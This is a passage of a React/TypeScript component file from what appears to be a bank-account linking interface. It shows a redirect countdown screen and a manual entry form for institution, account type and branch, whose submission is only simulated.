                  <circle
                    cx="40" cy="40" r="34"
                    fill="none"
                    stroke="#6D1ED4"
                    strokeWidth="8"
                    strokeLinecap="round"
                    strokeDasharray={`${2 * Math.PI * 34}`}
                    strokeDashoffset={`${2 * Math.PI * 34 * (1 - countdown / 5)}`}
                    style={{ transition: "stroke-dashoffset 1s linear" }}
                  />
                </svg>
                <span className={`absolute inset-0 flex items-center justify-center text-2xl font-bold ${t.countdownNum}`}>
                  {countdown}
                </span>
              </div>
              <p className={`font-semibold ${t.redirectTitle} text-lg`}>{c.redirectingTo(selected.name)}</p>
              <p className={`${t.redirectMsg} text-sm mt-1 mb-6`}>{c.openingIn(countdown)}</p>
              <button
                onClick={doRedirect}
                className="inline-flex items-center gap-2 bg-[#6D1ED4] hover:bg-[#5A18B0] text-white font-semibold px-6 py-3 rounded-xl transition-colors focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:ring-offset-2 min-h-[44px]"
              >
                {c.continueNow}
                <ArrowRight className="w-4 h-4" />
              </button>
            </div>
          )}
        </div>
      )}
    </main>
  )
}

// ─── Manual entry fallback ────────────────────────────────────────────────────

function ManualEntryForm({ language, clientMode = false }: { language: "en" | "fr"; clientMode?: boolean }) {
  const c = COPY[language] ?? COPY.en

  const [form, setForm]             = useState({ institution: "", accountType: "", branch: "" })
  const [submitting, setSubmitting] = useState(false)
  const [done, setDone]             = useState(false)

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    if (!form.institution || !form.accountType) return
    setSubmitting(true)
    setTimeout(() => { setSubmitting(false); setDone(true) }, 1500)
  }

  const inputCls = clientMode
    ? "w-full border border-gray-200 bg-white rounded-xl px-3 py-2.5 text-sm text-gray-900 placeholder:text-gray-400 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:border-transparent"
    : "w-full border border-zinc-700 bg-zinc-800 rounded-xl px-3 py-2.5 text-sm text-white placeholder:text-zinc-500 focus:outline-none focus:ring-2 focus:ring-[#6D1ED4] focus:border-transparent"

  const labelCls  = clientMode ? "text-xs font-semibold text-gray-500 block mb-1" : "text-xs font-semibold text-zinc-400 block mb-1"
  const headingCls = clientMode ? "text-sm font-semibold text-gray-700 mb-2" : "text-sm font-semibold text-zinc-300 mb-2"
  const btnCls    = clientMode
    ? "flex items-center gap-2 bg-gray-900 hover:bg-gray-700 text-white font-semibold px-5 py-2.5 rounded-xl text-sm transition-colors disabled:opacity-50 min-h-[44px]"
    : "flex items-center gap-2 bg-zinc-900 hover:bg-zinc-700 text-white font-semibold px-5 py-2.5 rounded-xl text-sm transition-colors disabled:opacity-50 min-h-[44px]"

  if (done) {
    return (
      <div className="flex items-center gap-3 p-4 bg-green-50 border border-green-200 rounded-xl text-sm text-green-700">
        <CheckCircle2 className="w-5 h-5 shrink-0" />
        <span>{c.manualSuccess}</span>
      </div>
    )
  }

  return (
    <form onSubmit={handleSubmit} className="space-y-3 max-w-md">
      <h3 className={headingCls}>{c.manualTitle}</h3>
      <div className="grid grid-cols-2 gap-3">
        <div>
          <label className={labelCls}>{c.manualInstitutionLabel}</label>
          <input
            required
            value={form.institution}
            onChange={(e) => setForm({ ...form, institution: e.target.value })}
            placeholder={c.manualInstitutionPlaceholder}
            className={inputCls}
            style={{ fontSize: "16px" }}
          />
        </div>
        <div>
          <label className={labelCls}>{c.manualAccountTypeLabel}</label>
          <select
            required
            value={form.accountType}
            onChange={(e) => setForm({ ...form, accountType: e.target.value })}
            className={inputCls}
            style={{ fontSize: "16px" }}
          >
            <option value="">{c.manualAccountTypeDefault}</option>
            <option value="chequing">{c.manualChequing}</option>
            <option value="savings">{c.manualSavings}</option>
            <option value="business">{c.manualBusiness}</option>
          </select>
        </div>
      </div>
      <div>
        <label className={labelCls}>{c.manualBranchLabel}</label>
        <input
          value={form.branch}
          onChange={(e) => setForm({ ...form, branch: e.target.value })}
          placeholder={c.manualBranchPlaceholder}
          className={inputCls}
          style={{ fontSize: "16px" }}
        />
      </div>
      <button type="submit" disabled={submitting} className={btnCls}>
        {submitting ? (
          <><Loader2 className="w-4 h-4 animate-spin" />{c.manualSubmitting}</>
        ) : (
          c.manualSubmit
        )}
      </button>
    </form>
  )
}
